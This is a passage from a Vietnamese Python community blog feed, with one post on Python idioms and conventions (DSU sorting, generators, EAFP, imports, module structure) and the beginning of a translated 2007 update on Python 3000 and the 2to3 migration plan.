            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1000000000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="sap-xep-voi-dsu"&gt;
&lt;h2&gt;Sắp xếp với DSU&lt;/h2&gt;
&lt;p&gt;DSU là Decorate-Sort-Undecorate (trang hoàng, sắp xếp, khử trang hoàng).&lt;/p&gt;
&lt;p&gt;Thay vì tạo một hàm so sánh riêng, ta có thể tạo một danh sách tạm sẽ được sắp xếp. Ví dụ để sắp xếp một danh sách các chuỗi theo thứ tự chữ cái thường của chúng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mot Hai Ba&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# a_list = [&amp;quot;Mot&amp;quot;, &amp;quot;Hai&amp;quot;, &amp;quot;Ba&amp;quot;]&lt;/span&gt;

&lt;span class="c1"&gt;# Decorate:&lt;/span&gt;
&lt;span class="n"&gt;to_sort&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
           &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a_list&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# to_sort = [(&amp;quot;mot&amp;quot;, &amp;quot;Mot&amp;quot;), (&amp;quot;hai&amp;quot;, &amp;quot;Hai&amp;quot;), (&amp;quot;ba&amp;quot;, &amp;quot;Ba&amp;quot;)]&lt;/span&gt;

&lt;span class="c1"&gt;# Sort:&lt;/span&gt;
&lt;span class="n"&gt;to_sort&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# to_sort = [(&amp;quot;ba&amp;quot;, &amp;quot;Ba&amp;quot;), (&amp;quot;hai&amp;quot;, &amp;quot;Hai&amp;quot;), (&amp;quot;mot&amp;quot;, &amp;quot;Mot&amp;quot;)]&lt;/span&gt;

&lt;span class="c1"&gt;# Undecorate:&lt;/span&gt;
&lt;span class="n"&gt;a_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;to_sort&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# a_list = [&amp;quot;Ba&amp;quot;, &amp;quot;Hai&amp;quot;, &amp;quot;Mot&amp;quot;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Đây là sự đổi chác giữa bộ nhớ và thời gian. Đơn giản và nhanh hơn, nhưng tốn bộ nhớ hơn vì chúng ta cần tạo một danh sách mới.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="bo-sinh-generator"&gt;
&lt;h2&gt;Bộ sinh (generator)&lt;/h2&gt;
&lt;p&gt;Chúng ta đã gặp biểu thức bộ sinh. Chúng ta cũng có thể tạo những bộ sinh phức tạp riêng như là những hàm:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;my_range_generator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
        &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;my_range_generator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;do_something&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Từ khóa &lt;tt class="docutils literal"&gt;yield&lt;/tt&gt; biến một hàm thành một bộ sinh. Khi bạn gọi một hàm bộ sinh (generator function), thay vì thực thi mã ngay lập tức, Python trả về một đối tượng bộ sinh (generator object), cũng là một bộ lặp vì nó có phương thức &lt;tt class="docutils literal"&gt;next()&lt;/tt&gt;. Vòng &lt;tt class="docutils literal"&gt;for&lt;/tt&gt; gọi phương thức &lt;tt class="docutils literal"&gt;next()&lt;/tt&gt; của bộ lặp cho đến khi biệt lệ &lt;tt class="docutils literal"&gt;StopIteration&lt;/tt&gt; được nâng. Bạn có thể tự nâng &lt;tt class="docutils literal"&gt;StopIteration&lt;/tt&gt; hoặc nó sẽ được nâng khi đến cuối bộ sinh.&lt;/p&gt;
&lt;p&gt;Vòng &lt;tt class="docutils literal"&gt;for&lt;/tt&gt; có một vế &lt;tt class="docutils literal"&gt;else&lt;/tt&gt; sẽ được thực thi khi mà bộ lặp chạy xong, nhưng không được thực thi khi thoát khỏi bằng câu lệnh &lt;tt class="docutils literal"&gt;break&lt;/tt&gt;. Ví dụ nếu chúng ta muốn kiểm tra xem điều kiện nào đó có thỏa với một phần tử bất kỳ của một dãy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sequence&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Condition not satisfied.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ để lọc các dòng trắng khỏi bộ đọc CSV hoặc các phần tử của một danh sách:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;filter_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;row_iterator&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;row_iterator&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;

&lt;span class="n"&gt;data_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;irows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_file&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hoặc đọc từng dòng từ tập tin văn bản:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;datafile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;datafile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;datafile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;do_something&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Điều này làm được là vì các đối tượng tập tin hỗ trợ phương thức &lt;tt class="docutils literal"&gt;next()&lt;/tt&gt; y như các bộ lặp khác: danh sách, bộ, từ điển (cho các khóa của nó), và các bộ sinh.&lt;/p&gt;
&lt;p&gt;Một điều cần lưu ý là bạn không thể dùng lẫn lộn &lt;tt class="docutils literal"&gt;next()&lt;/tt&gt; và &lt;tt class="docutils literal"&gt;read()&lt;/tt&gt; ở các đối tượng tập tin trừ khi bạn dùng Python 2.5 trở lên.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="eafp-v-s-lbyl"&gt;
&lt;h2&gt;EAFP v.s. LBYL&lt;/h2&gt;
&lt;p&gt;Easier to Ask Forgiveness than Permission: Dễ xin sự tha thứ hơn là sự cho phép. Ý là cứ làm đi và tìm sự tha thứ sau nếu làm sai, còn hơn là tìm sự cho phép trước khi làm.&lt;/p&gt;
&lt;p&gt;Look Before You Leap: Nhìn trước khi nhảy. Ý là phải xem xét hết các trường hợp có thể xảy ra trước khi làm.&lt;/p&gt;
&lt;p&gt;Thông thường EAFP được ưa chuộng hơn.&lt;/p&gt;
&lt;p&gt;Ví dụ như để ép kiểu một biến thành kiểu chuỗi, ta có thể gói đoạn mã trong một câu lệnh &lt;tt class="docutils literal"&gt;try&lt;/tt&gt; thay vì dùng &lt;tt class="docutils literal"&gt;isinstance()&lt;/tt&gt;. Và thông thường thì bạn sẽ nhận ra giải pháp tổng quát hơn là nếu bạn cố tìm ra mọi trường hợp có thể.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;TypeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Luôn luôn chỉ rõ kiểu biệt lệ! Không bao giờ dùng vế &lt;tt class="docutils literal"&gt;except&lt;/tt&gt; đơn giản vì nó sẽ chụp luôn cả những biệt lệ không lường trước, làm cho mã của bạn khó gỡ rối.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="khong-dung-from-module-import"&gt;
&lt;h2&gt;Không dùng &lt;tt class="docutils literal"&gt;from module import *&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;Thay vào đó, tham chiếu tới tên qua tên mô-đun:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;module&lt;/span&gt;
&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hoặc dùng tên mô-đun ngắn:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;long_module_name&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;mod&lt;/span&gt;
&lt;span class="n"&gt;mod&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hoặc tự nhập vào các tên bạn cần:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;module&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;
&lt;span class="n"&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="mo-dun-va-kich-ban"&gt;
&lt;h2&gt;Mô-đun và kịch bản&lt;/h2&gt;
&lt;p&gt;Để vừa tạo một mô-đun và một kịch bản chạy được:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="c1"&gt;# script code here&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trừ trường hợp rất cần thiết, bạn không nên đặt mã thực thi ở mức cao nhất mà hãy đặt chúng ở trong các hàm, các lớp, hoặc các phương thức rồi dùng nó trong &lt;tt class="docutils literal"&gt;if __name__ == '__main__'&lt;/tt&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cau-truc-mo-dun"&gt;
&lt;h2&gt;Cấu trúc mô-đun&lt;/h2&gt;
&lt;p&gt;Một mô-đun nên có cấu trúc như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;module docstring&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# imports&lt;/span&gt;
&lt;span class="c1"&gt;# constants&lt;/span&gt;
&lt;span class="c1"&gt;# exception classes&lt;/span&gt;
&lt;span class="c1"&gt;# interface functions&lt;/span&gt;
&lt;span class="c1"&gt;# classes&lt;/span&gt;
&lt;span class="c1"&gt;# internal functions &amp;amp; classes&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="goi"&gt;
&lt;h2&gt;Gói&lt;/h2&gt;
&lt;pre class="literal-block"&gt;
package/
    __init__.py    # &amp;lt;-- Lưu ý
    module1.py
    subpackage/
        __init__.py
        module2.py
&lt;/pre&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Dùng để quản lý dự án&lt;/li&gt;
&lt;li&gt;Giảm các mục trong đường dẫn nạp (load-path)&lt;/li&gt;
&lt;li&gt;Giảm xung đột tên&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;package.module1&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;packages.subpackage&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;module2&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;packages.subpackage.module2&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong Python 2.5 chúng ta có nhập tuyệt đối (absolute import) và nhập tương đối (relative import):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;absolute_import&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="don-gian-tot-hon-phuc-tap"&gt;
&lt;h2&gt;Đơn giản tốt hơn phức tạp&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Debugging is twice as hard as writing the code in the first place.
Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it.&lt;/p&gt;
&lt;p class="attribution"&gt;&amp;mdash;Brian W. Kernighan, cùng tác giả của &lt;em&gt;The C Programming Language&lt;/em&gt; và là chữ &lt;tt class="docutils literal"&gt;K&lt;/tt&gt; trong &lt;tt class="docutils literal"&gt;AWK&lt;/tt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Tạm dịch: Gỡ rối khó gấp hai lần viết mã. Cho nên, nếu bạn viết mã lanh lợi nhất có thể, thì bạn, theo định nghĩa, không đủ thông minh để gỡ rối. Nói một cách khác, hãy giữ cho chương trình của bạn đơn giản.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="dung-sang-tao-lai-banh-xe"&gt;
&lt;h2&gt;Đừng sáng tạo lại bánh xe&lt;/h2&gt;
&lt;p&gt;Trước khi viết mã, hãy:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Xem qua thư viện chuẩn của Python&lt;/li&gt;
&lt;li&gt;Xem qua chỉ mục các gói Python (còn được biết đến là &lt;em&gt;Cửa hàng phô mai&lt;/em&gt;, Cheese Shop)&lt;/li&gt;
&lt;li&gt;Tìm qua mạng&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
</content><category term="idiom"></category><category term="convention"></category></entry><entry><title>Cập nhật tình hình Python 3000</title><link href="/2007/06/cap-nhat-tinh-hinh-python-3000.html" rel="alternate"></link><published>2007-06-22T02:02:00+07:00</published><updated>2007-06-22T02:02:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2007-06-22:/2007/06/cap-nhat-tinh-hinh-python-3000.html</id><summary type="html">&lt;p&gt;Ngày 19 tháng 06 năm 2007, Guido van Rossum, tác giả ngôn ngữ Python, gửi lên mạng một bài cập nhật về tình hình phát triển Python 3000. Bài lược dịch (từ trang &lt;a class="reference external" href="http://www.artima.com/weblogs/viewpost.jsp?thread=208549"&gt;http://www.artima.com/weblogs/viewpost.jsp?thread=208549&lt;/a&gt;) này tóm tắt về khoảng trượt kế hoạch …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 19 tháng 06 năm 2007, Guido van Rossum, tác giả ngôn ngữ Python, gửi lên mạng một bài cập nhật về tình hình phát triển Python 3000. Bài lược dịch (từ trang &lt;a class="reference external" href="http://www.artima.com/weblogs/viewpost.jsp?thread=208549"&gt;http://www.artima.com/weblogs/viewpost.jsp?thread=208549&lt;/a&gt;) này tóm tắt về khoảng trượt kế hoạch 2 tháng và nhiều tính năng mới.&lt;/p&gt;
&lt;div class="section" id="nhin-chung-ve-ke-hoach"&gt;
&lt;h2&gt;Nhìn chung về kế hoạch&lt;/h2&gt;
&lt;div class="section" id="lich-su"&gt;
&lt;h3&gt;Lịch sử&lt;/h3&gt;
&lt;p&gt;Guido nghĩ đến ý tưởng về Python 3000 (tên được đặt ra nhằm để chế giễu Windows 2000) vào khoảng năm 2000, trong một hội thảo Python. Theo đó, Python 3000 sẽ là bản đầu tiên bỏ qua tính tương thích ngược để tạo ra một ngôn ngữ tốt nhất cho sau này.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="dien-bien-gan-day"&gt;
&lt;h3&gt;Diễn biến gần đây&lt;/h3&gt;
&lt;p&gt;Khoảng một năm rưỡi trước, Guido thật sự bắt đầu thiết kế Python 3000. Hàng loạt đề xuất cải tiến Python (Python Enhancement Proposal, PEP) ra đời được đặt số thứ tự từ 3000 trở lên (PEP 3000 trước đó được đổi thành PEP 3100). &lt;a class="reference external" href="http://python.org/dev/peps/pep-3000/"&gt;PEP 3000&lt;/a&gt; trở thành tài liệu chính về tư tưởng và kế hoạch của Python 3000.&lt;/p&gt;
&lt;p&gt;Từ đó, việc phát triển đã chảy dưới chân cầu &lt;a class="reference external" href="http://mail.python.org/pipermail/python-dev/"&gt;python-dev&lt;/a&gt;, và sau đó được chuyển hẳn qua &lt;a class="reference external" href="http://mail.python.org/pipermail/python-3000/"&gt;python-3000&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="ke-hoach-du-tinh"&gt;
&lt;h3&gt;Kế hoạch dự tính&lt;/h3&gt;
&lt;p&gt;Lịch trình được thông báo khoảng một năm trước và nhắm vào cuối tháng 06 năm 2007 sẽ có bản alpha đầu tiên và vào một năm sau có bản cuối cùng (Python 3.0 là dấu hiệu phiên bản khi nó được phát hành; &amp;quot;Python 3000&amp;quot; hay &amp;quot;Py3k&amp;quot; là tên mã của dự án).&lt;/p&gt;
&lt;p&gt;Kế hoạch này đã bị trễ một chút. Hiện tại chúng ta dự tính khoảng cuối tháng 08 mới có bản alpha, và dĩ nhiên bản cuối cùng cũng bị trễ hai tháng. Lý do chính cho sự trễ này chủ yếu là do việc chuyển qua sử dụng Unicode toàn bộ.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="python-2-6"&gt;
&lt;h3&gt;Python 2.6&lt;/h3&gt;
&lt;p&gt;Phiên bản “đồng hành” 2.6 sẽ ra lò vài tháng trước 3.0. Nếu bạn không thích sử dụng phiên bản mới nhất, thì 2.6 sẽ là phiên bản bạn sẽ dùng, và nó sẽ không khác gì mấy so với 2.5.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="tinh-tuong-thich-va-su-chuyen-doi"&gt;
&lt;h2&gt;Tính tương thích và sự chuyển đổi&lt;/h2&gt;
&lt;div class="section" id="tinh-tuong-thich"&gt;
&lt;h3&gt;Tính tương thích&lt;/h3&gt;
&lt;p&gt;Python 3.0 sẽ phá vỡ tính tương thích ngược. Toàn bộ.&lt;/p&gt;
&lt;p&gt;Ngược lại, Python 2.6 sẽ giữ vững tính tương thích ngược với Python 2.5 (và các phiên bản khác có thể), và nó cũng sẽ hỗ trợ tương thích tiến, theo những lối sau:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Python 2.6 sẽ hỗ trợ &lt;em&gt;chế độ cảnh báo Py3k&lt;/em&gt; và sẽ cảnh báo khi chạy những tính năng mà sẽ không còn hoạt động trong Python 3.0, ví dụ như khi nghĩ hàm range() trả về một danh sách.&lt;/li&gt;
&lt;li&gt;Python 2.6 sẽ có những chức năng từ Py3k, kích hoạt bằng &lt;tt class="docutils literal"&gt;__future__&lt;/tt&gt; hoặc sử dụng cả cú pháp mới lẫn cú pháp cũ (nếu cú pháp không hợp lệ trong 2.5).&lt;/li&gt;
&lt;li&gt;Cùng với tính tương thích tiến, sẽ có một &lt;a class="reference external" href="http://svn.python.org/view/sandbox/trunk/2to3/"&gt;công cụ chuyển đổi mã nguồn&lt;/a&gt;. Công cụ này có thể dịch từ-nguồn-tới-nguồn theo chế độ phi ngữ cảnh. Lấy một ví dụ thật đơn giản, nó có thể dịch &lt;tt class="docutils literal"&gt;apply(f, args)&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;f(*args)&lt;/span&gt;&lt;/tt&gt;. Tuy nhiên, công cụ này không thể khảo sát dữ liệu hoặc phỏng đoán kiểu cho nên nó chỉ đơn giản giả định rằng &lt;tt class="docutils literal"&gt;apply&lt;/tt&gt; trong ví dụ này là hàm có sẵn trong phiên bản cũ.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="viec-chuyen-doi"&gt;
&lt;h3&gt;Việc chuyển đổi&lt;/h3&gt;
&lt;p&gt;Mô hình phát triển một kế hoạch mà cần hỗ trợ cả 2.6 và 3.0 cùng lúc được khuyến khích như sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Bắt đầu bằng hàng loạt các kiểm tra đơn vị (unit test), tốt nhất là bao trùm toàn bộ.&lt;/li&gt;
&lt;li&gt;Chuyển kế hoạch qua Python 2.6.&lt;/li&gt;
&lt;li&gt;Bật chế độ cảnh báo Py3k.&lt;/li&gt;
&lt;li&gt;Kiểm tra và chỉnh sửa cho đến khi không còn cảnh báo.&lt;/li&gt;
&lt;li&gt;Dùng công cụ &lt;em&gt;2to3&lt;/em&gt; để chuyển mã nguồn này sang cú pháp 3.0. &lt;strong&gt;Không sửa kết quả bằng tay!&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Kiểm tra mã nguồn đã đổi ở 3.0.&lt;/li&gt;
&lt;li&gt;Nếu phát hiện vấn đề thì sửa mã cho phiên bản &lt;strong&gt;2.6&lt;/strong&gt; và quay lại bước 3.&lt;/li&gt;
&lt;li&gt;Khi cần phát hành, phát hành hai bản 2.6 và 3.0 riêng biệt.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Nếu công cụ chuyển đổi và tính tương thích tiến trong Python 2.6 làm việc tốt, các bước từ 2 đến 6 sẽ không cần nhiều hơn những gì cần thiết để chuyển từ Python 2.x lên 2.(x+1).&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="tinh-hinh-cua-nhung-tinh-nang-rieng-le"&gt;
&lt;h2&gt;Tình hình của những tính năng riêng lẻ&lt;/h2&gt;
&lt;p&gt;Có rất nhiều thay đổi để liệt kê hết ra ở đây nên chỉ những tính năng quan trọng, hoặc có mâu thuẫn sẽ được nhắc đến.&lt;/p&gt;
